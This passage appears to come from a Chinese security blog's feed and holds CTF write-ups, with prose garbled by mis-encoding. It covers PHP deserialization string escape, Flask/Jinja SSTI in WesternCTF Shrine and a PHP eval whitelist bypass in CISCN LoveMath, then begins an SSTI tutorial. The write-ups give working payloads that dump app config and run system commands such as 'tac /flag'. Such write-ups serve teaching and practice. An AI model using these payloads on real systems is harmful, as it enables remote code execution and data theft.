src="https://s1.ax1x.com/2020/05/21/YqFeud.png" alt="2"></p><p>æ­¤æ—¶çš„nameæ‰€è¯»å–çš„æ•°æ®ä¸ºaaaaâ€è€Œæ­£å¸¸çš„è¯­æ³•æ˜¯éœ€è¦ç”¨â€;åŽ»é—­åˆå½“å‰çš„å˜é‡ï¼Œè€Œå› ä¸ºé•¿åº¦é”™è¯¯æ‰€ä»¥æ­¤æ—¶phpæŠŠé—­åˆçš„åŒå¼•å·å½“åšäº†å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥ä¸‹ä¸€ä¸ªå­—ç¬¦å°±æˆäº†åˆ†å·ï¼Œæ²¡èƒ½é—­åˆå¯¼è‡´æŠ›å‡ºäº†é”™è¯¯ã€‚</p><p>æŠŠç²¾åŠ›å›žåˆ°å¼€å¤´æ‰€è¯´çš„ä»£ç ï¼Œæ ¹æ®åˆšæ‰è®²çš„ï¼Œå¦‚æžœæˆ‘ä»¬å°†nameå˜é‡ä¸­æ·»åŠ bbåˆ™ç¨‹åºä¼šæŠ¥é”™ã€‚</p><p><img src="https://s1.ax1x.com/2020/05/21/YqF1C8.png" alt="3"><br> æŸ¥çœ‹è¿‡æ»¤å‰åŽçš„ä»£ç èƒ½å‘çŽ°ï¼Œåº”è¯¥æ˜¯6ä½é•¿åº¦çš„nameå˜é‡åœ¨è¿‡æ»¤åŽå˜æˆäº†7ä½ï¼Œæ ¹æ®ååºåˆ—åŒ–è¯»å–å˜é‡çš„åŽŸåˆ™æ¥è®²ï¼Œæ­¤æ—¶çš„nameèƒ½è¯»å–åˆ°çš„æ˜¯aaaaccï¼Œæœ«å°¾å¤„çš„é‚£ä¸ªcæ˜¯è¯»å–ä¸åˆ°çš„ï¼Œè¿™å°±å½¢æˆäº†ä¸€ä¸ªå­—ç¬¦ä¸²çš„é€ƒé€¸ã€‚å½“æˆ‘ä»¬æ·»åŠ å¤šä¸ªbbï¼Œæ¯æ·»åŠ ä¸€ä¸ªbbæˆ‘ä»¬å°±èƒ½é€ƒé€¸ä¸€ä¸ªå­—ç¬¦ï¼Œé‚£æˆ‘ä»¬å°†é€ƒé€¸çš„å­—ç¬¦ä¸²çš„é•¿åº¦å¡«å……æˆæˆ‘ä»¬è¦ååºåˆ—åŒ–çš„ä»£ç çš„è¯é‚£å°±å¯ä»¥æŽ§åˆ¶ååºåˆ—åŒ–çš„ç»“æžœä»¥åŠç±»é‡Œé¢çš„å˜é‡å€¼äº†ã€‚</p><p><img src="https://s1.ax1x.com/2020/05/21/YqFtDs.png" alt="4"></p><p>å¡«å……å¦‚ä¸Šå›¾æ•°é‡çš„bbå³å¯ä¿®æ”¹passçš„å€¼ã€‚</p><p>å…·ä½“åˆ†æžå¦‚ä¸‹ï¼š<br> <img src="https://s1.ax1x.com/2020/05/21/YqklZR.png" alt="5"></p><p>é€ƒé€¸æˆ–è€…è¯´è¢«â€œé¡¶â€å‡ºæ¥çš„payloadå°±ä¼šè¢«å½“åšå½“å‰ç±»çš„å±žæ€§è¢«æ‰§è¡Œã€‚<br> <img src="https://s1.ax1x.com/2020/05/21/YqktzD.png" alt="6"></p><p> è½¬è½½<a href="https://www.cnblogs.com/Sumarua/">https://www.cnblogs.com/Sumarua/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WesternCTF:2018-Shrine</title>
      <link href="2021/07/07/westernctf-2018-shrine/"/>
      <url>2021/07/07/westernctf-2018-shrine/</url>
      
        <content type="html"><![CDATA[<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> flask<span class="token keyword">import</span> osapp <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'FLAG'</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'FLAG'</span><span class="token punctuation">)</span><span class="token operator">//</span>æ³¨å†Œåä¸ºâ€œflagâ€çš„config@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> open<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/shrine/&lt;path:shrine>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">shrine</span><span class="token punctuation">(</span>shrine<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">safe_jinja</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'self'</span><span class="token punctuation">]</span><span class="token operator">//</span>è¿‡æ»¤configã€self        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'{{% set {}=None%}}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> blacklist<span class="token punctuation">]</span><span class="token punctuation">)</span>         <span class="token operator">+</span> s    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template_string<span class="token punctuation">(</span>safe_jinja<span class="token punctuation">(</span>shrine<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><pre><code>/shrine/{{7*7}}</code></pre><p><img src="/2021/07/07/westernctf-2018-shrine/image-20210711160403714.png" alt="image-20210711160403714"></p><p>å­˜åœ¨sstiæ¼æ´ž</p><pre><code>/shrine/{{url_for.__globals__}}</code></pre><p><img src="/2021/07/07/westernctf-2018-shrine/image-20210711155833559.png" alt="image-20210711155833559"></p><pre><code>/shrine/{{url_for.__globals__['current_app'].config}}</code></pre><p><img src="/2021/07/07/westernctf-2018-shrine/image-20210711160013564.png" alt="image-20210711160013564"></p><p><strong>get_flashed_messages</strong></p><p>è¿”å›žä¹‹å‰åœ¨Flaskä¸­é€šè¿‡ flash() ä¼ å…¥çš„é—ªçŽ°ä¿¡æ¯åˆ—è¡¨ã€‚æŠŠå­—ç¬¦ä¸²å¯¹è±¡è¡¨ç¤ºçš„æ¶ˆæ¯åŠ å…¥åˆ°ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œç„¶åŽé€šè¿‡è°ƒç”¨ get_flashed_messages() æ–¹æ³•å–å‡º(é—ªçŽ°ä¿¡æ¯åªèƒ½å–å‡ºä¸€æ¬¡ï¼Œå–å‡ºåŽé—ªçŽ°ä¿¡æ¯ä¼šè¢«æ¸…ç©º</p><pre><code>/shrine/{{get_flashed_messages.__globals__['current_app'].config}}</code></pre><p><img src="/2021/07/07/westernctf-2018-shrine/image-20210711155441788.png" alt="image-20210711155441788"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CISCN:2019-LoveMath</title>
      <link href="2021/07/06/ciscn-2019-lovemath/"/>
      <url>2021/07/06/ciscn-2019-lovemath/</url>
      
        <content type="html"><![CDATA[<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//ä¾‹å­ c=20-1</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">80</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"å¤ªé•¿äº†ä¸ä¼šç®—"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'`'</span><span class="token punctuation">,</span> <span class="token string">'\['</span><span class="token punctuation">,</span> <span class="token string">'\]'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blackitem</span> <span class="token punctuation">.</span> <span class="token string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span>    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'abs'</span><span class="token punctuation">,</span> <span class="token string">'acos'</span><span class="token punctuation">,</span> <span class="token string">'acosh'</span><span class="token punctuation">,</span> <span class="token string">'asin'</span><span class="token punctuation">,</span> <span class="token string">'asinh'</span><span class="token punctuation">,</span> <span class="token string">'atan2'</span><span class="token punctuation">,</span> <span class="token string">'atan'</span><span class="token punctuation">,</span> <span class="token string">'atanh'</span><span class="token punctuation">,</span> <span class="token string">'base_convert'</span><span class="token punctuation">,</span> <span class="token string">'bindec'</span><span class="token punctuation">,</span> <span class="token string">'ceil'</span><span class="token punctuation">,</span> <span class="token string">'cos'</span><span class="token punctuation">,</span> <span class="token string">'cosh'</span><span class="token punctuation">,</span> <span class="token string">'decbin'</span><span class="token punctuation">,</span> <span class="token string">'dechex'</span><span class="token punctuation">,</span> <span class="token string">'decoct'</span><span class="token punctuation">,</span> <span class="token string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string">'exp'</span><span class="token punctuation">,</span> <span class="token string">'expm1'</span><span class="token punctuation">,</span> <span class="token string">'floor'</span><span class="token punctuation">,</span> <span class="token string">'fmod'</span><span class="token punctuation">,</span> <span class="token string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string">'hypot'</span><span class="token punctuation">,</span> <span class="token string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string">'log10'</span><span class="token punctuation">,</span> <span class="token string">'log1p'</span><span class="token punctuation">,</span> <span class="token string">'log'</span><span class="token punctuation">,</span> <span class="token string">'max'</span><span class="token punctuation">,</span> <span class="token string">'min'</span><span class="token punctuation">,</span> <span class="token string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string">'octdec'</span><span class="token punctuation">,</span> <span class="token string">'pi'</span><span class="token punctuation">,</span> <span class="token string">'pow'</span><span class="token punctuation">,</span> <span class="token string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string">'rand'</span><span class="token punctuation">,</span> <span class="token string">'round'</span><span class="token punctuation">,</span> <span class="token string">'sin'</span><span class="token punctuation">,</span> <span class="token string">'sinh'</span><span class="token punctuation">,</span> <span class="token string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string">'srand'</span><span class="token punctuation">,</span> <span class="token string">'tan'</span><span class="token punctuation">,</span> <span class="token string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$used_funcs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$used_funcs</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'echo '</span><span class="token punctuation">.</span><span class="token variable">$content</span><span class="token punctuation">.</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> </code></pre><ol><li>payloadé•¿åº¦ä¸èƒ½è¶…è¿‡80</li><li>payloadä¸­ä¸èƒ½åŒ…å«â€™ â€˜, â€˜\tâ€™, â€˜\râ€™, â€˜\nâ€™,â€™â€™â€™, â€˜â€œâ€˜, â€˜`â€™, â€˜[â€˜, â€˜]â€™ è¿™äº›å­—ç¬¦</li><li>payloadä¸­ä¸èƒ½æœ‰ä¸æ˜¯$whitelistç™½åå•é‡Œé¢çš„å•è¯å‡ºçŽ°</li></ol><p><strong>base_convert() å‡½æ•°ï¼šåœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—</strong></p><p><strong>hex2bin() å‡½æ•°ï¼šæŠŠåå…­è¿›åˆ¶å€¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸º ASCII å­—ç¬¦</strong></p><p><strong>dechex() å‡½æ•°æŠŠåè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶</strong></p><pre><code>?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=tac /flag</code></pre><ul><li>base_convert(37907361743,10,36) =&gt; â€œhex2binâ€</li><li>dechex(1598506324) =&gt; â€œ5f474554â€</li><li>$pi=hex2bin(â€œ5f474554â€) =&gt; $pi=â€_GETâ€   //hex2binå°†ä¸€ä¸²16è¿›åˆ¶æ•°è½¬æ¢ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</li><li>($$pi){pi}(($$pi){abs}) =&gt; ($GET){pi}($_GET){abs}  //{}å¯ä»¥ä»£æ›¿[]</li></ul><pre><code>?c=$pi=base_convert,$pi(696468,10,36)(($pi(8768397090111664438,10,30))(){1})//exec(getallheaders(){1})</code></pre><ul><li>base_convert(696468,10,36) =&gt; â€œexecâ€</li><li>$pi(8768397090111664438,10,30) =&gt; â€œgetallheadersâ€</li><li>exec(getallheaders(){1})</li><li>//æ“ä½œxxå’Œyyï¼Œä¸­é—´ç”¨é€—å·éš”å¼€ï¼Œechoéƒ½èƒ½è¾“å‡ºecho xx,yy</li></ul><pre><code>?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&amp;0=system&amp;1=cat%20/flag</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Web:æœåŠ¡å™¨æ¨¡æ¿æ³¨å…¥æ”»å‡»</title>
      <link href="2021/07/05/web-fu-wu-qi-mo-ban-zhu-ru-gong-ji/"/>
      <url>2021/07/05/web-fu-wu-qi-mo-ban-zhu-ru-gong-ji/</url>
      
        <content type="html"><![CDATA[<p>åŽŸæ–‡ï¼š<a href="https://zhuanlan.zhihu.com/p/28823933">https://zhuanlan.zhihu.com/p/28823933</a></p><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a><strong>æ¦‚è¿°</strong></h2><p>æ¨¡æ¿å¼•æ“Žå¯ä»¥è®©ï¼ˆç½‘ç«™ï¼‰ç¨‹åºå®žçŽ°ç•Œé¢ä¸Žæ•°æ®åˆ†ç¦»ï¼Œä¸šåŠ¡ä»£ç ä¸Žé€»è¾‘ä»£ç çš„åˆ†ç¦»ï¼Œè¿™å¤§å¤§æå‡äº†å¼€å‘æ•ˆçŽ‡ï¼Œè‰¯å¥½çš„è®¾è®¡ä¹Ÿä½¿å¾—ä»£ç é‡ç”¨å˜å¾—æ›´åŠ å®¹æ˜“ã€‚ä¸Žæ­¤åŒæ—¶ï¼Œå®ƒä¹Ÿæ‰©å±•äº†é»‘å®¢çš„æ”»å‡»é¢ã€‚é™¤äº†å¸¸è§„çš„ XSS å¤–ï¼Œæ³¨å…¥åˆ°æ¨¡æ¿ä¸­çš„ä»£ç è¿˜æœ‰å¯èƒ½å¼•å‘ RCEï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼‰ã€‚é€šå¸¸æ¥è¯´ï¼Œè¿™ç±»é—®é¢˜ä¼šåœ¨åšå®¢ï¼ŒCMSï¼Œwiki  ä¸­äº§ç”Ÿã€‚è™½ç„¶æ¨¡æ¿å¼•æ“Žä¼šæä¾›æ²™ç®±æœºåˆ¶ï¼Œæ”»å‡»è€…ä¾ç„¶æœ‰è®¸å¤šæ‰‹æ®µç»•è¿‡å®ƒã€‚åœ¨è¿™ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘å°†ä¼šæ”»å‡»å‡ ä¸ªæ¨¡æ¿å¼•æ“Žæ¥è¯´æ˜Žè¯¥ç±»æ¼æ´žï¼Œå¹¶å±•ç¤ºæ²™ç®±é€ƒé€¸æŠ€æœ¯ã€‚</p><h2 id="ä»€ä¹ˆæ˜¯æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥"><a href="#ä»€ä¹ˆæ˜¯æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥" class="headerlink" title="ä»€ä¹ˆæ˜¯æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥"></a><strong>ä»€ä¹ˆæ˜¯æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥</strong></h2><p>é€šè¿‡æ¨¡æ¿ï¼ŒWebåº”ç”¨å¯ä»¥æŠŠè¾“å…¥è½¬æ¢æˆç‰¹å®šçš„HTMLæ–‡ä»¶æˆ–è€…emailæ ¼å¼ã€‚å°±æ‹¿ä¸€ä¸ªé”€å”®è½¯ä»¶æ¥è¯´ï¼Œæˆ‘ä»¬å‡è®¾å®ƒä¼šå‘é€å¤§é‡çš„é‚®ä»¶ç»™å®¢æˆ·ï¼Œå¹¶åœ¨æ¯å°é‚®ä»¶å‰SKEæ’å…¥é—®å€™è¯­ï¼Œå®ƒä¼šé€šè¿‡Twigï¼ˆä¸€ä¸ªæ¨¡æ¿å¼•æ“Žï¼‰åšå¦‚ä¸‹å¤„ç†ï¼š</p><pre class=" language-php"><code class="language-php"><span class="token variable">$output</span> <span class="token operator">=</span> <span class="token variable">$twig</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">render</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'custom_email'</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"first_name"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$user</span><span class="token punctuation">.</span>first_name<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æœ‰ç»éªŒçš„è¯»è€…å¯èƒ½è¿…é€Ÿå‘çŽ° XSSï¼Œä½†æ˜¯é—®é¢˜ä¸æ­¢å¦‚æ­¤ã€‚è¿™è¡Œä»£ç å…¶å®žæœ‰æ›´æ·±å±‚æ¬¡çš„éšæ‚£ï¼Œå‡è®¾æˆ‘ä»¬å‘é€å¦‚ä¸‹è¯·æ±‚ï¼š</p><pre class=" language-text"><code class="language-text">custom_email={{7*7}} // GET å‚æ•°49  // $output ç»“æžœ</code></pre><p>è¿˜æœ‰æ›´ç¥žå¥‡çš„ç»“æžœï¼š</p><pre class=" language-text"><code class="language-text">custom_email={{self}} // GET å‚æ•°Object of class__TwigTemplate_7ae62e582f8a35e5ea6cc639800ecf15b96c0d6f78db3538221c1145580ca4a5 could not be converted to string // é”™è¯¯</code></pre><p>æˆ‘ä»¬ä¸éš¾çŒœåˆ°æœåŠ¡å™¨æ‰§è¡Œäº†æˆ‘ä»¬ä¼ è¿‡åŽ»çš„æ•°æ®ã€‚æ¯å½“æœåŠ¡å™¨ç”¨æ¨¡æ¿å¼•æ“Žè§£æžç”¨æˆ·çš„è¾“å…¥æ—¶ï¼Œè¿™ç±»é—®é¢˜éƒ½æœ‰å¯èƒ½å‘ç”Ÿã€‚é™¤äº†å¸¸è§„çš„è¾“å…¥å¤–ï¼Œæ”»å‡»è€…è¿˜å¯ä»¥é€šè¿‡ LFIï¼ˆæ–‡ä»¶åŒ…å«ï¼‰è§¦å‘å®ƒã€‚æ¨¡æ¿æ³¨å…¥å’Œ SQL æ³¨å…¥çš„äº§ç”ŸåŽŸå› æœ‰å‡ åˆ†ç›¸ä¼¼â€”â€”éƒ½æ˜¯å°†æœªè¿‡æ»¤çš„æ•°æ®ä¼ ç»™å¼•æ“Žè§£æžã€‚</p><p>ä¸ºä»€ä¹ˆæˆ‘ä»¬åœ¨æ¨¡æ¿æ³¨å…¥å‰åŠ â€œæœåŠ¡ç«¯â€å‘¢ï¼Ÿè¿™æ˜¯ä¸ºäº†å’Œ jQueryï¼ŒKnockoutJS äº§ç”Ÿçš„å®¢æˆ·ç«¯æ¨¡æ¿æ³¨å…¥åŒºåˆ«å¼€æ¥ã€‚é€šå¸¸çš„æ¥è®²ï¼Œå‰è€…ç”šè‡³å¯ä»¥è®©æ”»å‡»è€…æ‰§è¡Œä»»æ„ä»£ç ï¼Œè€ŒåŽè€…åªèƒ½ XSSã€‚</p><h2 id="æ¨¡æ¿æ³¨å…¥çš„æ‰‹æ³•"><a href="#æ¨¡æ¿æ³¨å…¥çš„æ‰‹æ³•" class="headerlink" title="æ¨¡æ¿æ³¨å…¥çš„æ‰‹æ³•"></a><strong>æ¨¡æ¿æ³¨å…¥çš„æ‰‹æ³•</strong></h2><p>æ ¹æ®æˆ‘çš„ç»éªŒï¼Œæˆ‘æ€»ç»“å‡ºå¦‚ä¸‹æ­¥éª¤ï¼š</p><p><img src="https://pic4.zhimg.com/80/v2-b7184f6422f3b507a713a5843bb00723_720w.jpg" alt="img"></p><h2 id="1ï¼šæŽ¢æµ‹æ¼æ´ž"><a href="#1ï¼šæŽ¢æµ‹æ¼æ´ž" class="headerlink" title="1ï¼šæŽ¢æµ‹æ¼æ´ž"></a><strong>1ï¼šæŽ¢æµ‹æ¼æ´ž</strong></h2><p>æ¼æ´žä¸€èˆ¬å‡ºçŽ°åœ¨è¿™ä¸¤ç§æƒ…å†µä¸‹ï¼Œè€Œæ¯ç§æœ‰ä¸åŒçš„æŽ¢æµ‹æ‰‹æ³•ï¼š</p><h2 id="æ–‡æœ¬ç±»"><a href="#æ–‡æœ¬ç±»" class="headerlink" title="æ–‡æœ¬ç±»"></a><strong>æ–‡æœ¬ç±»</strong></h2><p>å¤§éƒ¨åˆ†çš„æ¨¡æ¿è¯­è¨€æ”¯æŒæˆ‘ä»¬è¾“å…¥ HTMLï¼Œæ¯”å¦‚ï¼š</p><pre class=" language-smarty"><code class="language-smarty">smarty=Hello <span class="token smarty"><span class="token delimiter punctuation">{</span><span class="token function">user</span><span class="token punctuation">.</span><span class="token variable">name</span><span class="token delimiter punctuation">}</span></span>Hello user1freemarker=Hello $<span class="token smarty"><span class="token delimiter punctuation">{</span><span class="token function">username</span><span class="token delimiter punctuation">}</span></span>Hello newuserany=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span>Hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span>Hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span></code></pre><p>æœªç»è¿‡æ»¤çš„è¾“å…¥ä¼šäº§ç”Ÿ XSSï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ XSS åšæˆ‘ä»¬æœ€åŸºæœ¬çš„æŽ¢é’ˆã€‚é™¤æ­¤ä¹‹å¤–ï¼Œæ¨¡æ¿è¯­è¨€çš„è¯­æ³•å’Œ HTML è¯­æ³•ç›¸å·®ç”šå¤§ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç”¨å…¶ç‹¬ç‰¹çš„è¯­æ³•æ¥æŽ¢æµ‹æ¼æ´žã€‚è™½ç„¶å„ç§æ¨¡æ¿çš„å®žçŽ°ç»†èŠ‚ä¸å¤§ä¸€æ ·ï¼Œä¸è¿‡å®ƒä»¬çš„åŸºæœ¬è¯­æ³•å¤§è‡´ç›¸åŒï¼Œæˆ‘ä»¬å¯ä»¥å‘é€å¦‚ä¸‹ payloadï¼š</p><pre class=" language-smarty"><code class="language-smarty">smarty=Hello $<span class="token smarty"><span class="token delimiter punctuation">{</span><span class="token number">7</span><span class="token operator">*</span><span class="token number">7</span><span class="token delimiter punctuation">}</span></span>Hello 49freemarker=Hello $<span class="token smarty"><span class="token delimiter punctuation">{</span><span class="token number">7</span><span class="token operator">*</span><span class="token number">7</span><span class="token delimiter punctuation">}</span></span>Hello 49</code></pre><p>æ¥ç¡®è®¤æ¼æ´žã€‚</p><h2 id="ä»£ç ç±»"><a href="#ä»£ç ç±»" class="headerlink" title="ä»£ç ç±»"></a><strong>ä»£ç ç±»</strong></h2><p>åœ¨ä¸€äº›çŽ¯å¢ƒä¸‹ï¼Œç”¨æˆ·çš„è¾“å…¥ä¹Ÿä¼šè¢«å½“ä½œæ¨¡æ¿çš„å¯æ‰§è¡Œä»£ç ã€‚æ¯”å¦‚è¯´å˜é‡åï¼š</p><pre class=" language-text"><code class="language-text">personal_greeting=usernameHello user01</code></pre><p>è¿™ç§æƒ…å†µä¸‹ï¼ŒXSS çš„æ–¹æ³•å°±æ— æ•ˆäº†ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ç ´å template è¯­å¥ï¼Œå¹¶é™„åŠ æ³¨å…¥çš„HTMLæ ‡ç­¾ä»¥ç¡®è®¤æ¼æ´žï¼š</p><pre class=" language-text"><code class="language-text">personal_greeting=username<tag>Hellopersonal_greeting=username}}<tag>Hello user01 <tag></code></pre><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a><strong>ä¿¡æ¯æ”¶é›†</strong></h2><p>æ£€æµ‹åˆ°æ¨¡æ¿æ³¨å…¥åŽï¼Œæˆ‘ä»¬éœ€è¦åˆ¤æ–­å…·ä½“çš„æ¨¡æ¿å¼•æ“Žã€‚æˆ‘ä»¬éœ€è¦  fuzz 